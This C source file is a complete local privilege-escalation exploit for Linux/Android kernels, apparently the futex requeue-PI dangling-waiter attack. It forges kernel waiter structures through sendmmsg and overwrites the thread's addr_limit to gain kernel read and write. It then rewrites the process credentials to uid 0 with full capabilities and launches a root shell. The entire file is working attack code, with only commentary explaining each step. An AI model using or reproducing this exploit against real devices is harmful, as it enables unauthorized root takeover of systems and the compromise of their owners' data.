#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <fcntl.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

#define ARRAY_SIZE(a)		(sizeof (a) / sizeof (*(a)))

#define KERNEL_START		0xc0000000

#define LOCAL_PORT		1337

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;
};

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};


struct mmsghd {
	struct msghdr msg_hdr;
	unsigned int  msg_len;
};

//bss
int uaddr1 = 0;
int uaddr2 = 0;
struct thread_info *HACKS_final_stack_base = NULL;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;

ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	/* int pipe(int pipefd[2]); 
	pipe() creates a pipe, a unidirectional data channel that can be 
	used for interprocess communication. The array pipefd is used to 
	return two file descriptors referring to the ends of the pipe. 
	pipefd[0] refers to the read end of the pipe. pipefd[1] refers to 
	the write end of the pipe. Data written to the write end of the 
	pipe is buffered by the kernel until it is read from the read end 
	of the pipe. */
	pipe(pipefd);

	len = write(pipefd[1], writebuf, count);
	read(pipefd[0], readbuf, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	write(pipefd[1], writebuf, count);
	len = read(pipefd[0], readbuf, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}


/* below code by vegafish */

int cnt_voluntary_ctxt_switches(pid_t pid)
{
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char* pdest;
	int vcscnt;

	sprintf(filename, "/proc/self/task/%d/status", pid);
	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	} else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches") + 25;
		vcscnt = atoi(pdest);
		fclose(fp);
	}
	return vcscnt;
}
/* above code by vegafish */

void write_kernel(int signum)
{
	struct thread_info stackbuf;
	unsigned long taskbuf[0x100];
	struct cred *cred;
	struct cred credbuf;
	struct task_security_struct *security;
	struct task_security_struct securitybuf;
	pid_t pid;
	int i;
	int ret;
	FILE *fp;

	printf("write_kernel started\n");

	pthread_mutex_lock(&is_thread_awake_lock);
	/* wake up search_goodnum */
	pthread_cond_signal(&is_thread_awake);
	pthread_mutex_unlock(&is_thread_awake_lock);

	if (HACKS_final_stack_base == NULL) {
		/* Thread's priority 11 will run this block of code */
		static unsigned long new_addr_limit = 0xffffffff;
		char *slavename;
		int pipefd[2];
		char readbuf[0x100];

		printf("cpid1 resumed\n");

		pthread_mutex_lock(is_kernel_writing);

		/* http://rachid.koucha.free.fr/tech_corner/pty_pdip.html */
		HACKS_fdm = open("/dev/ptmx", O_RDWR);
		unlockpt(HACKS_fdm);
		slavename = ptsname(HACKS_fdm);

		open(slavename, O_RDWR);

		/* wake up search_goodnum */
		do_splice_tid_read = 1;

		/* wait for search_goodnum */
		while (did_splice_tid_read == 0) {
			;  // line A --- modify by vegafish
		}

		read(HACKS_fdm, readbuf, sizeof readbuf);

		printf("addr_limit: %p\n", &HACKS_final_stack_base->addr_limit);
		
		/* 1) write new_addr_limit (0xffffffff) to pipefd[1] 
		2) read pipefd[0] to HACKS_final_stack_base->addr_limit */
		write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit);

		/* addr_limit of thread's priority 10 was modified to 0xffffffff */
		pthread_mutex_unlock(is_kernel_writing);

		while (1) {
			sleep(10);
		}
	}

	printf("cpid3 resumed.\n");

	pthread_mutex_lock(is_kernel_writing);

	/* When we come here, the addr_limit of thread's priority 10 was changed to 0xffffffff */
	printf("Hacked.\n");

	read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf);
	read_pipe(stackbuf.task, taskbuf, sizeof taskbuf);

	cred = NULL;
	security = NULL;
	pid = 0;

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		struct task_struct_partial *task = (void *)&taskbuf[i];


		if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
		 && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
		 && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
		 && task->real_cred == task->cred) {
			cred = task->cred;
			break;
		}
	}

	read_pipe(cred, &credbuf, sizeof credbuf);

	credbuf.uid = 0;
	credbuf.gid = 0;
	credbuf.suid = 0;
	credbuf.sgid = 0;
	credbuf.euid = 0;
	credbuf.egid = 0;
	credbuf.fsuid = 0;
	credbuf.fsgid = 0;

	credbuf.cap_inheritable.cap[0] = 0xffffffff;
	credbuf.cap_inheritable.cap[1] = 0xffffffff;
	credbuf.cap_permitted.cap[0] = 0xffffffff;
	credbuf.cap_permitted.cap[1] = 0xffffffff;
	credbuf.cap_effective.cap[0] = 0xffffffff;
	credbuf.cap_effective.cap[1] = 0xffffffff;
	credbuf.cap_bset.cap[0] = 0xffffffff;
	credbuf.cap_bset.cap[1] = 0xffffffff;

	write_pipe(cred, &credbuf, sizeof credbuf);

	pid = syscall(__NR_gettid);

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		static unsigned long write_value = 1;

		if (taskbuf[i] == pid) {
			write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);

			if (getuid() != 0) {
				printf("ROOT FAILED\n");
				while (1) {
					sleep(10);
				}
			}
		}
	}

	sleep(1);

	system("/system/bin/sh -i");
	system("/system/bin/touch /dev/rooted");

	pid = fork();

	pthread_mutex_lock(&done_lock);
	pthread_cond_signal(&done);
	pthread_mutex_unlock(&done_lock);

	while (1) {
		sleep(10);
	}

	return;
}

static inline void setup_exploit(unsigned long mem)
{
	*((unsigned long *)(mem - 0x04)) = 0x81; /* 0x81 = 129 => Prio = 9 */
	*((unsigned long *)(mem + 0x00)) = mem + 0x20; /* 0x20 = 32 */
	*((unsigned long *)(mem + 0x08)) = mem + 0x28; /* 0x28 = 40 */

	*((unsigned long *)(mem + 0x1c)) = 0x85; /* (0x1c = 28); 0x85 = 133 => Prio = 13 */
	*((unsigned long *)(mem + 0x24)) = mem; /* 0x24 = 36 */
	*((unsigned long *)(mem + 0x2c)) = mem + 8;
}

void *make_action(void *arg) {
	int prio;
	struct sigaction act;
	int ret;
	sigset_t block_mask;

	prio = (int)arg;
	last_tid = syscall(__NR_gettid);

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_cond_signal(&is_thread_desched);

	act.sa_handler = write_kernel;
 	sigemptyset(&block_mask);
	act.sa_mask = block_mask;
	act.sa_flags = 0;
	/* The function write_kernel will be triggered when 
	a make_action thread receives signal "12" */
	sigaction(12, &act, NULL);

	setpriority(PRIO_PROCESS, 0, prio);

	printf("make_action: prio %d, thread id %d\n", prio, last_tid);

	pthread_mutex_unlock(&is_thread_desched_lock);

	do_dm_tid_read = 1;
	while (did_dm_tid_read == 0) {
		;  // here is correspond to line A ---
	}

	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
	printf("futex dm: %d\n", ret);

	while (1) {
		sleep(10);
	}

	return NULL;
}

pid_t wake_actionthread(int prio) {
	pid_t pid;
	pthread_t th4;
	int vcscnt, vcscnt2;

	do_dm_tid_read = 0;
	did_dm_tid_read = 0;

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_create(&th4, 0, make_action, (void *)(uintptr_t)(prio));
	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

	pid = last_tid;
	vcscnt = cnt_voluntary_ctxt_switches(pid);  // add by vegafish

	while (do_dm_tid_read == 0) {
		usleep(10);
	}

	did_dm_tid_read = 1;

	while (1) {
		vcscnt2 = cnt_voluntary_ctxt_switches(pid);  // add by vegafish
		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);
	}

	pthread_mutex_unlock(&is_thread_desched_lock);

	return pid;
}

int make_socket() {
	int sockfd;
	struct sockaddr_in addr = {0};
	int ret;
	int sock_buf_size;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
	if (sockfd < 0) {
		printf("socket failed.\n");
		usleep(10);
	} else {
		addr.sin_family = AF_INET;
		addr.sin_port = htons(LOCAL_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	}

	while (1) {
		ret = connect(sockfd, (struct sockaddr *)&addr, 16);
		if (ret >= 0) {
			break;
		}
		usleep(10);
	}

	sock_buf_size = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

	return sockfd;
}

void *send_magicmsg(void *arg) {
	int sockfd;
	struct mmsghd msgvec[1];
	struct iovec msg_iov[8];
	unsigned long databuf[0x20];
	int i;
	int ret;

	waiter_thread_tid = syscall(__NR_gettid);
	/* int setpriority(int which, int who, int prio); 
	who = 0: current process 
	prio: is a value in the range -20 to 19
	lower numerical value = higher priority (.e.g, 11 is higher than 12)*/
	setpriority(PRIO_PROCESS, 0, 12);

	sockfd = make_socket();

	/** Start of Thomas code **/
	setup_exploit(MAGIC);

	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
		databuf[i] = 0x81; /* any value is fine */
	}

	for (i = 0; i < 8; i++) {
		msg_iov[i].iov_base = (void *)MAGIC;
		msg_iov[i].iov_len = 0x10;
	}
	/* struct rt_mutex_waiter {
	    struct plist_node list_entry;
	    struct plist_node pi_list_entry;
	    struct task_struct *task;
	    struct rt_mutex *lock;
	}
	struct plist_node {
	    int prio;
	    struct list_head prio_list;
	    struct list_head node_list;
	} */
	/* Fill out list_entry */
	msg_iov[3].iov_base = (void *)0x81; /* list_entry->prio = 9 */
	msg_iov[3].iov_len = MAGIC + 0x20; /* list_entry->prio_list->next */
	msg_iov[4].iov_base = (void *)(MAGIC + 0x20); /* list_entry->prio_list->prev */
	msg_iov[4].iov_len = MAGIC + 0x28; /* list_entry->node_list->next */
	msg_iov[5].iov_base = (void *)(MAGIC + 0x28); /* list_entry->node_list->prev */
	/* Fill out pi_list_entry */
	msg_iov[5].iov_len = 0x81; /* pi_list_entry->prio = 9 */
	msg_iov[6].iov_base = (void*)(MAGIC + 0x34); /* pi_list_entry->prio_list->next */
	msg_iov[6].iov_len = MAGIC + 0x34; /* pi_list_entry->prio_list->prev */
	msg_iov[7].iov_base = (void*)(MAGIC + 0x3C); /* pi_list_entry->node_list->next */
	msg_iov[7].iov_len = MAGIC + 0x3C; /* pi_list_entry->node_list->prev */
	/** End of Thomas code ***/

	/* Fill out msgvec with our expected data */
	msgvec[0].msg_hdr.msg_name = databuf;
	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
	msgvec[0].msg_hdr.msg_iov = msg_iov;
	msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
	msgvec[0].msg_hdr.msg_control = databuf;
	msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
	msgvec[0].msg_hdr.msg_flags = 0;
	msgvec[0].msg_len = 0;

	/* Want to obtain uaddr2, but first wait on uaddr1 */
	syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
	
	/* When we are here, we already got the dangling rt_waiter in the wait list of uaddr2 */	
	
	/* Release the block on while loop of search_goodnum */
	do_socket_tid_read = 1;

	while (1) {
		if (did_socket_tid_read != 0) {
			break;
		}
	}

	/* Keep overwriting the dangling rt_waiter to create two fake waiters, 
	which are under our control */
	ret = 0;
	while (1) {
		ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
		if (ret <= 0) {
			break;
		}
	}

	while (1) {
		sleep(10);
	}

	return NULL;
}

void *search_goodnum(void *arg) {
	int ret;
	int vcscnt, vcscnt2;
	unsigned long magicval;
	pid_t pid;
	unsigned long goodval, goodval2;
	unsigned long addr, setaddr;
	int i;
	char buf[0x1000];

	/* Lock uaddr2 */
	syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

	while (1) {
		/* Move waiters on uaddr1 to uaddr2 */
		ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
		if (ret == 1) {
			break;
		}
		usleep(10);
	}

	/* Create two waiters, whose priorities are 6 and 7, on uaddr2 */
	wake_actionthread(6);
	wake_actionthread(7);

	/* Forcefully release uaddr2 */	
	uaddr2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;

	/* Wake up send_magicmsg thread and create a dangling rt_waiter */
	syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
	printf("**** search_goodnum: dangling waiter was created\n");

	while (1) {
		if (do_socket_tid_read != 0) {
			break;
		}
	}

	vcscnt = cnt_voluntary_ctxt_switches(waiter_thread_tid);  // add by vegafish

	/* Release block on while loop of send_magicmsg */
	did_socket_tid_read = 1;

	while (1) {
		vcscnt2 = cnt_voluntary_ctxt_switches(waiter_thread_tid);  // add by vegafish
		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);
	}

	printf("starting the dangerous things\n");

	setup_exploit(MAGIC_ALT);
	setup_exploit(MAGIC);

	magicval = *((unsigned long *)MAGIC);

	/* Add a kernel waiter, whose priority is 11, to the middle 
	of fake waiter 1 and fake waiter 2 */
	wake_actionthread(11);

	if (*((unsigned long *)MAGIC) == magicval) {
		printf("using MAGIC_ALT.\n");
		MAGIC = MAGIC_ALT;
	}

	while (1) {
		is_kernel_writing = (pthread_mutex_t *)malloc(4);
		pthread_mutex_init(is_kernel_writing, NULL);

		setup_exploit(MAGIC);

		/* Add a kernel waiter, whose priority is 11, to the middle 
		of fake waiter 1 and fake waiter 2 */
		pid = wake_actionthread(11);

		/* Got the address of the thread_info */
		goodval = *((unsigned long *)MAGIC) & 0xffffe000;

		printf("%p is a good number\n", (void *)goodval);

		do_splice_tid_read = 0;
		did_splice_tid_read = 0;

		pthread_mutex_lock(&is_thread_awake_lock);

		/*  int kill(pid_t pid, int sig); 
		send signal "12" to thread pid */
		kill(pid, 12);

		/* Wait for write_kernel... */
		pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
		pthread_mutex_unlock(&is_thread_awake_lock);

		while (1) {
			if (do_splice_tid_read != 0) {
				break;
			}
			usleep(10);
		}

		vcscnt = cnt_voluntary_ctxt_switches(pid);  // add by vegafish

		/* Release the block on while loop of write_kernel */
		did_splice_tid_read = 1;

		while (1) {
			vcscnt2 = cnt_voluntary_ctxt_switches(pid);  // add by vegafish
			if (vcscnt2 != vcscnt + 1) {
				break;
			}
			usleep(10);
		}

		goodval2 = 0;

		setup_exploit(MAGIC);

		/* Make the prio_list->prev pointer of fake waiter 1 point to address of addr_limit of a thread, whose priority is 11 */
		*((unsigned long *)(MAGIC + 0x24)) = goodval + 8; /* &addr_limit = thread_info + 8 */
		
		/* Add a kernel waiter, whose priority is 12, to the middle 
		of fake waiter 1 and fake waiter 2 */
		wake_actionthread(12);
		/* Now, addr_limit has value of the the new kernel waiter->prio_list->next
		(priority of the waiter is 12) */

		/* goodval2 has the value of new kernel waiter->prio_list->next 
		(priority of the waiter is 12) */
		goodval2 = *((unsigned long *)(MAGIC + 0x24));

		printf("%p is also a good number.\n", (void *)goodval2);

		for (i = 0; i < 9; i++) {
			setup_exploit(MAGIC);

			pid = wake_actionthread(10);

			/* Check if the next poiter of thread's priority 10 is lower than addr_limit of thread's priority 11 */
			if (*((unsigned long *)MAGIC) < goodval2) {
				/* Good thread found */
				HACKS_final_stack_base = (struct thread_info *)(*((unsigned long *)MAGIC) & 0xffffe000);

				pthread_mutex_lock(&is_thread_awake_lock);

				kill(pid, 12);

				pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
				pthread_mutex_unlock(&is_thread_awake_lock);

				printf("GOING\n");

				write(HACKS_fdm, buf, sizeof buf);

				while (1) {
					sleep(10);
				}
			}

		}
	}

	return NULL;
}

void *accept_socket(void *arg) {
	int sockfd;
	int yes;
	struct sockaddr_in addr = {0};
	int ret;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

	yes = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(LOCAL_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 1);

	while(1) {
		ret = accept(sockfd, NULL, NULL);
		if (ret < 0) {
			printf("**** SOCK_PROC failed ****\n");
			while(1) {
				sleep(10);
			}
		} else {
			printf("msg socket established.\n");

		}
	}

	return NULL;
}

void init_exploit() {
	unsigned long addr;
	pthread_t th1, th2, th3;

	printf("1 with pid %d\n", getpid());

	pthread_create(&th1, NULL, accept_socket, NULL);

	/* void *mmap(void *addr, size_t length, int " prot ", int " flags , int fd, off_t offset) 
	MAP_ANONYMOUS: The mapping is not backed by any file; its contents are initialized to zero. */
	addr = (unsigned long)mmap((void *)0x0a000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	/* Note: We should not use an address whose 32 MSB is 1 since the addr will be used to overwrite the msg_iov[x].iov_len, 
	 whose data type is unsigned int. If we use such a value, kernel panic will happen */
	/* addr points to the mapped area if success, otherwise (void*)-1 */
	addr += 0x800;
	MAGIC = addr;
	printf("MAGIC is: %lu\n", addr);

	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC_ALT = addr;
	printf("MAGIC_ALT is: %lu\n", addr);

	pthread_mutex_lock(&done_lock);
	pthread_create(&th2, NULL, search_goodnum, NULL);
	pthread_create(&th3, NULL, send_magicmsg, NULL);
	pthread_cond_wait(&done, &done_lock);
}

int main(int argc, char **argv) {
	init_exploit();

	while (1) {
		sleep(10);
	}

	return 0;
}

